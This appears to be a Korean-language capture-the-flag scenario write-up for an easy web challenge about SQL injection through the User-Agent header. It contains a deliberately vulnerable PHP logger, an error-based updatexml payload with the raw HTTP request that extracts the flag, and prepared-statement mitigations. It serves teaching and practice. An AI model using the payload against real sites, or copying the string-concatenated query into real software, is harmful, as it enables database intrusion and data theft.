---
title: HTTP Header SQL Injection — Web CTF Scenario
created: 2026-06-15
updated: 2026-06-15
type: ctf-scenario
tags: [ctf, web, sqli, http-header, user-agent, injection, easy]
confidence: high
---

# HTTP Header SQL Injection (HTTP 헤더를 이용한 SQL 인젝션) — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Access Logger Lite (간이 접속 로그 기록기)
- **난이도**: Easy (초급)
- **핵심 컨셉**: 웹 브라우저가 전송하는 HTTP 요청 헤더에 삽입된 데이터가 서버 측 데이터베이스에 기록 및 활용되는 과정에서 적절한 매개변수화 처리 없이 가공되어 발생하는 **HTTP 헤더 기반 SQL Injection (HTTP Header Injection Basic)** 취약점 문제입니다.
- 대상 웹 서비스는 사용자가 페이지에 방문할 때마다 통계 분석을 목적으로 클라이언트의 브라우저 정보(`User-Agent`)와 접속 IP 정보를 추출하여 데이터베이스의 방문 로그 테이블(`visit_logs`)에 기록합니다. 개발자는 일반적인 웹 입력 폼의 입력값만 보안 검사(SQLi 필터링)를 설정하면 안전할 것이라 오판하여, 서버에서 추출된 HTTP 헤더 변수인 `HTTP_USER_AGENT` 값을 쿼리 조립 시 문자열 병합 방식으로 결합시켰습니다. 공격자는 웹 요청 시 `User-Agent` 헤더 영역에 SQL 인젝션 페이로드를 담아 전송함으로써 백엔드 DB 서버를 제어하고 플래그를 취득할 수 있습니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Access Log Tracer (`/index.php`)**:
  - 사용자가 방문했을 때 메인 페이지 내용을 노출하고 백그라운드에서 로그 적재 쿼리를 동작시키는 파일.
  - 리퀘스트 헤더의 `User-Agent` 값을 가공 없이 참조해 `visit_logs` 테이블에 INSERT 쿼리를 실행함.
- **Flag 위치**:
  - 데이터베이스의 내부 독립 테이블 `flag_store` 컬럼 내부의 플래그 문자열.

### 2.2 취약점 지점
1. **Insecure Processing of Server Variables (Header Fields)**:
  - 백엔드 내부의 로그 로직이 `$_SERVER['HTTP_USER_AGENT']` 변수를 SQL 구문과 직접 조립합니다:
    `$sql = "INSERT INTO visit_logs (user_agent) VALUES ('" . $_SERVER['HTTP_USER_AGENT'] . "')";`
  - 공격자가 User-Agent 값을 `' UNION SELECT ...` 혹은 에러 기반 SQLi 패턴을 띄도록 조작해 전송하면, 데이터베이스 엔진은 헤더 문자열 내에 섞인 SQL 구조 기호인 홑따옴표(`'`)를 인식하여 원본 쿼리 구조를 변형하고 뒤따르는 하위 서브쿼리를 실행시킵니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 메소드 | 인증 | 파라미터 | 데이터 타입 | 취약 함수 및 태그 |
|------------|--------|------|----------|-------------|-------------------|
| `/index.php` | GET | 불필요 | `User-Agent` (HTTP Header) | Text / SQL Payload | SQL INSERT 구문 내 `$_SERVER` 정보 결합부 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. HTTP 헤더 조작 환경 준비 및 에러 테스트
1. 브라우저의 확장 도구(헤더 수정기) 또는 프록시(Burp Suite), 파이썬 스크립트를 준비합니다.
2. `/index.php` 페이지로 일반 요청을 보내어 응답을 본 뒤, 이번에는 HTTP Request Header의 `User-Agent` 필드 값을 싱글 쿼터 한 개(`'`)로 교체하여 전송합니다.
3. 서버 응답 결과로 데이터베이스 문법 에러(예: `SQL syntax error`)가 출력되거나, HTTP 500 Internal Server Error 상태 코드가 리턴되는 지점을 확보하여 인젝션 공격 계기를 탐지합니다.

### Step 2. INSERT 기반 SQL Injection 페이로드 작성
1. 로그가 적재되는 INSERT 쿼리의 컬럼 구조 개수를 유추하거나 조작하여 데이터 추출을 위한 구문을 완성합니다.
2. 서브쿼리를 에러 기반(Error-based SQLi) 형식으로 결합하여 헤더에 주입하는 방안을 채택합니다.
   - **주입용 User-Agent 조작 값**:
     `' OR updatexml(1, concat(0x3a, (SELECT flag FROM flag_store LIMIT 1)), 1) OR '`

### Step 3. 조작된 헤더를 탑재해 요청 전송
1. 가공된 헤더 페이로드를 장착해 메인 화면에 접속합니다:
   ```http
   GET /index.php HTTP/1.1
   Host: target.local
   User-Agent: ' OR updatexml(1, concat(0x3a, (SELECT flag FROM flag_store LIMIT 1)), 1) OR '
   Accept: */*
   ```
2. 요청을 전달받은 백엔드 서버가 DB의 INSERT 연산을 구동하다가 서브쿼리의 `updatexml` 함수 내부에 매핑된 `select flag` 서브쿼리를 실행하고 문법 예외를 터트립니다.

### Step 4. flag 획득
1. 반환된 화면 상의 예외 메시지 영역에 출력되어 나타난 데이터를 수집합니다:
   `XPATH syntax error: ':FLAG{http_header_user_agent_sqli_leak}'`
2. 에러 결과물에서 플래그(`FLAG{http_header_user_agent_sqli_leak}`)를 획득합니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (PHP)

```php
<!-- index.php (취약한 HTTP 헤더 SQLi PHP 예시) -->
<?php
// 데이터베이스 연결
$conn = new mysqli("localhost", "dbuser", "dbpass", "ctf_db");

// 1. 헤더로부터 User-Agent 값을 획득
$user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown';

// 취약점 지점: 일반 파라미터가 아닌 HTTP 헤더 필드 정보 역시 공격자가 임의로 변조하여
// 전송할 수 있는 신뢰할 수 없는 인풋 데이터임에도 불구하고, escapeshellarg나 
// Prepared Statement 바인딩 처리 없이 직접 SQL 쿼리 구문에 병합하여 데이터베이스로 전달함.
$sql = "INSERT INTO visit_logs (user_agent, access_time) VALUES ('" . $user_agent . "', NOW())";

if (!$conn->query($sql)) {
    // 디버그 편의를 위한 에러 출력 (Error-based SQLi 발동 계기)
    echo "Database Log Error: " . $conn->error;
} else {
    echo "<h1>Access Logged Successfully</h1>";
}
?>
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **매개변수화된 쿼리 (Prepared Statement)의 상시 적용**:
   - `User-Agent`, `Referer`, `X-Forwarded-For`와 같이 사용자가 헤더로 전달하는 정보는 절대 신뢰해서는 안 되는 외부 입력 변수입니다.
   - 따라서 데이터베이스 쿼리에 대입되는 모든 환경 변수 데이터는 의무적으로 `prepare()` 및 `bind_param()` 절차를 준수하여 SQL 엔진이 이를 문법 구문이 아닌 순수 정적 데이터 문자열로만 파싱하게 제한합니다.
     ```php
     // 안전한 매개변수 바인딩 적용
     $stmt = $conn->prepare("INSERT INTO visit_logs (user_agent, access_time) VALUES (?, NOW())");
     $stmt->bind_param("s", $user_agent);
     $stmt->execute();
     ```
2. **에러 핸들링 및 디버깅 메시지 노출 영구 비활성화**:
   - 실 가동 서버 환경 설정 상에서 데이터베이스 연결 에러 메시지(`$conn->error`)를 사용자 화면에 평문으로 인쇄하여 반환하는 행위를 금지합니다.
   - 에러 출력을 비활성화하면, SQL Injection 취약점이 존재하더라도 데이터베이스 정보를 에러 문자열로 뽑아내는 시도를 무력화할 수 있습니다.
3. **입력 데이터 정제 및 타입 변환**:
   - 문자열 형식의 헤더 데이터 중 IP 관련 헤더(`X-Forwarded-For`)를 처리할 시에는, 수신된 텍스트가 실제로 IP 포맷 주소와 부합하는지 화이트리스트 정규식 검사를 먼저 완료한 뒤 로깅 쿼리에 이송합니다.
